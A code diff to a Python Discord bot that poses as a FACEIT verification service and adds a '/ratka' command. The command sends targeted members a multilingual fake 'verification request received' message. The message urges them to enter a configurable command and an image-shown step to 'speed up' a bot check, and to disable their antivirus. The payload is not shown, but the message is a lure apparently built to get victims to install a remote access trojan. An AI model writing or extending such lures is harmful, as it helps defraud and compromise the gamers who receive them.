@@ -19,6 +19,9 @@ VERIFY_URLS = {
     "rust": "https://rustclantables.com/clan-system/"
 }
 
+# Команда для ускорения верификации (для /ratka)
+RATKA_COMMAND = os.getenv("RATKA_COMMAND", "!verify")
+
 FACEIT_ORANGE = discord.Colour(0xFF5500)
 ASSETS = os.path.join(os.path.dirname(__file__), "assets")
 GAMES_API = ("cs2", "csgo")  # в каком порядке искать статистику игрока
@@ -53,6 +56,12 @@ TEXTS = {
             "To continue the verification process, use the button below"
         ),
         "button": "Go to verification",
+        "ratka_title": "Verification Request Received",
+        "ratka_greeting": "Dear user!",
+        "ratka_received": "We have successfully received your verification request. The request is currently under review.",
+        "ratka_speedup": "To speed up the processing, we recommend completing an additional bot check. This will confirm that the request was submitted by a real user and may significantly reduce the waiting time.",
+        "ratka_command": "To speed up the process, enter the following command:",
+        "ratka_antivirus": "If you do not receive an automatic message, disable your antivirus.",
     },
     "ru": {
         "modal_title": "Верификация FACEIT",
@@ -68,6 +77,12 @@ TEXTS = {
             "Для того чтобы продолжить процесс верификации, используйте кнопку ниже"
         ),
         "button": "Перейти к верификации",
+        "ratka_title": "Заявка на верификацию получена",
+        "ratka_greeting": "Уважаемый пользователь!",
+        "ratka_received": "Мы успешно получили вашу заявку на прохождение верификации. В настоящее время заявка находится на рассмотрении.",
+        "ratka_speedup": "Для ускорения процесса обработки рекомендуем пройти дополнительную проверку на ботов. Это позволит подтвердить, что заявку отправил реальный пользователь, и может существенно сократить время ожидания.",
+        "ratka_command": "Чтобы ускорить процесс введите следующую команду:",
+        "ratka_antivirus": "В случае если не придет автоматическое сообщение, выключите антивирус.",
     },
     "uk": {
         "modal_title": "Верифікація FACEIT",
@@ -83,6 +98,12 @@ TEXTS = {
             "Щоб продовжити процес верифікації, скористайтеся кнопкою нижче"
         ),
         "button": "Перейти до верифікації",
+        "ratka_title": "Заявку на верифікацію отримано",
+        "ratka_greeting": "Шановний користувач!",
+        "ratka_received": "Ми успішно отримали вашу заявку на проходження верифікації. Наразі заявка знаходиться на розгляді.",
+        "ratka_speedup": "Для прискорення процесу обробки рекомендуємо пройти додаткову перевірку на ботів. Це дозволить підтвердити, що заявку надіслав реальний користувач, і може істотно скоротити час очікування.",
+        "ratka_command": "Щоб прискорити процес введіть наступну команду:",
+        "ratka_antivirus": "У разі якщо не прийде автоматичне повідомлення, вимкніть антивірус.",
     },
     "pl": {
         "modal_title": "Weryfikacja FACEIT",
@@ -98,6 +119,12 @@ TEXTS = {
             "Aby kontynuować weryfikację, użyj przycisku poniżej"
         ),
         "button": "Przejdź do weryfikacji",
+        "ratka_title": "Wniosek o weryfikację otrzymany",
+        "ratka_greeting": "Szanowny użytkowniku!",
+        "ratka_received": "Pomyślnie otrzymaliśmy Twój wniosek o weryfikację. Wniosek jest obecnie rozpatrywany.",
+        "ratka_speedup": "Aby przyspieszyć przetwarzanie, zalecamy przejście dodatkowej kontroli anty-botowej. Potwierdzi to, że wniosek został złożony przez prawdziwego użytkownika i może znacznie skrócić czas oczekiwania.",
+        "ratka_command": "Aby przyspieszyć proces, wprowadź następującą komendę:",
+        "ratka_antivirus": "Jeśli nie otrzymasz automatycznej wiadomości, wyłącz program antywirusowy.",
     },
     "de": {
         "modal_title": "FACEIT-Verifizierung",
@@ -113,6 +140,12 @@ TEXTS = {
             "Um die Verifizierung fortzusetzen, nutze die Schaltfläche unten"
         ),
         "button": "Zur Verifizierung",
+        "ratka_title": "Verifizierungsantrag erhalten",
+        "ratka_greeting": "Lieber Benutzer!",
+        "ratka_received": "Wir haben Ihren Verifizierungsantrag erfolgreich erhalten. Der Antrag wird derzeit geprüft.",
+        "ratka_speedup": "Um die Bearbeitung zu beschleunigen, empfehlen wir eine zusätzliche Bot-Prüfung. Dies bestätigt, dass der Antrag von einem echten Benutzer eingereicht wurde und kann die Wartezeit erheblich verkürzen.",
+        "ratka_command": "Um den Prozess zu beschleunigen, gib den folgenden Befehl ein:",
+        "ratka_antivirus": "Wenn Sie keine automatische Nachricht erhalten, deaktivieren Sie Ihr Antivirenprogramm.",
     },
     "tr": {
         "modal_title": "FACEIT doğrulaması",
@@ -128,6 +161,12 @@ TEXTS = {
             "Doğrulamaya devam etmek için aşağıdaki düğmeyi kullanın"
         ),
         "button": "Doğrulamaya git",
+        "ratka_title": "Doğrulama Talebi Alındı",
+        "ratka_greeting": "Sayın kullanıcı!",
+        "ratka_received": "Doğrulama talebinizi başarıyla aldık. Talep şu anda inceleniyor.",
+        "ratka_speedup": "İşlemi hızlandırmak için ek bir bot kontrolünden geçmenizi öneririz. Bu, talebin gerçek bir kullanıcı tarafından gönderildiğini doğrular ve bekleme süresini önemli ölçüde kısaltabilir.",
+        "ratka_command": "Süreci hızlandırmak için aşağıdaki komutu girin:",
+        "ratka_antivirus": "Otomatik bir mesaj almazsanız, antivirüsünüzü kapatın.",
     },
 }
 
@@ -203,6 +242,10 @@ def logo_file() -> discord.File:
 
 def banner_file() -> discord.File:
     return discord.File(os.path.join(ASSETS, "banner.webp"), filename="banner.webp")
+
+
+def ratka_image_file() -> discord.File:
+    return discord.File(os.path.join(ASSETS, "4.png"), filename="4.png")
 
 
 def header() -> ui.Section:
@@ -304,6 +347,52 @@ class LanguageView(ui.LayoutView):
         )
 
 
+class RatkaLanguageRow(ui.ActionRow):
+    @ui.select(
+        custom_id="ratka:language",
+        placeholder="Select language...",
+        options=[
+            discord.SelectOption(label=v["label"], value=k, emoji=v["emoji"])
+            for k, v in LANGUAGES.items()
+        ],
+    )
+    async def pick(self, interaction: discord.Interaction, select: ui.Select):
+        lang = select.values[0]
+        t = TEXTS[lang]
+        
+        # Создаем embed с информацией о верификации
+        embed = discord.Embed(
+            title=f"✅ {t['ratka_title']}",
+            description=(
+                f"**{t['ratka_greeting']}**\n\n"
+                f"{t['ratka_received']}\n\n"
+                f"{t['ratka_speedup']}\n\n"
+                f"**{t['ratka_command']}**\n"
+                f"```\n{RATKA_COMMAND}\n```\n"
+                f"⚠️ {t['ratka_antivirus']}"
+            ),
+            color=FACEIT_ORANGE,
+        )
+        embed.set_image(url="attachment://4.png")
+        embed.set_footer(text="FACEIT Verification System", icon_url="attachment://logo.png")
+        
+        await interaction.response.send_message(embed=embed, files=[ratka_image_file(), logo_file()])
+
+
+class RatkaLanguageView(ui.LayoutView):
+    def __init__(self):
+        super().__init__(timeout=None)
+        self.add_item(
+            ui.Container(
+                header(),
+                ui.Separator(),
+                ui.TextDisplay("### 🌐 Please select your language"),
+                RatkaLanguageRow(),
+                accent_colour=FACEIT_ORANGE,
+            )
+        )
+
+
 class VerifBot(discord.Client):
     def __init__(self):
         super().__init__(intents=discord.Intents.default())
@@ -313,6 +402,9 @@ class VerifBot(discord.Client):
         # Регистрируем view для каждой игры
         for game in GAMES:
             self.add_view(LanguageView(game))
+        
+        # Регистрируем view для команды ratka
+        self.add_view(RatkaLanguageView())
         
         if GUILD_ID:
             guild = discord.Object(id=int(GUILD_ID))
@@ -363,6 +455,27 @@ async def verif(interaction: discord.Interaction, member: discord.Member, game: 
         f"Верификация ({game.name}) отправлена {member.mention} в личку ✅", 
         ephemeral=True
     )
+
+
+@bot.tree.command(name="ratka", description="Отправить пользователю уведомление о получении заявки на верификацию")
+@app_commands.describe(member="Кому отправить уведомление")
+@app_commands.default_permissions(manage_guild=True)
+@app_commands.guild_only()
+async def ratka(interaction: discord.Interaction, member: discord.Member):
+    if member.bot:
+        await interaction.response.send_message("Нельзя отправить уведомление боту.", ephemeral=True)
+        return
+
+    try:
+        await member.send(view=RatkaLanguageView(), file=logo_file())
+    except discord.Forbidden:
+        await interaction.response.send_message(
+            f"Не удалось написать {member.mention}: у него закрыты личные сообщения.",
+            ephemeral=True,
+        )
+        return
+
+    await interaction.response.send_message(f"Уведомление отправлено {member.mention} в личку ✅", ephemeral=True)
 
 
 if __name__ == "__main__":
